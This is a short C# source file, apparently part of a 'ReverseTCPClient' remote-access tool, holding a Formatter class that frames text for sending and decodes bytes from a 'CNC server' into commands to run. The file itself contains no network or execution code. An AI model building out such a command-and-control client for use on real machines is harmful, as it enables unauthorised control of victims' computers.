using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ReverseTCPClient
{

    class Formatter
    {
        /// <summary>
        /// Formats and returns a given string making it ready for transmission.
        /// </summary>
        /// <param name="output">String that is to be parsed</param>
        /// <returns>Byte[] object ready to be transmitted.</returns>
        public byte[] parseForTransmit(string output)
        {
            output += "¯\\_(ツ)_/¯";
            byte[] parsedSubmission = Encoding.Unicode.GetBytes(output);
            return parsedSubmission;
        }

        /// <summary>
        /// Fromats raw byte[] object and returns a string ready for use.
        /// </summary>
        /// <param name="input">Byte[] object received from CNC server.</param>
        /// <returns>String ready to be run as a command.</returns>
        public string parseForLocalUse(byte[] input)
        {
            string[] delimiters = { "¯\\_(ツ)_/¯" };
            string rawString = Encoding.Unicode.GetString(input);
            string parsedString = rawString.Split(delimiters, StringSplitOptions.RemoveEmptyEntries)[0];
            return parsedString;
        }
    }
}
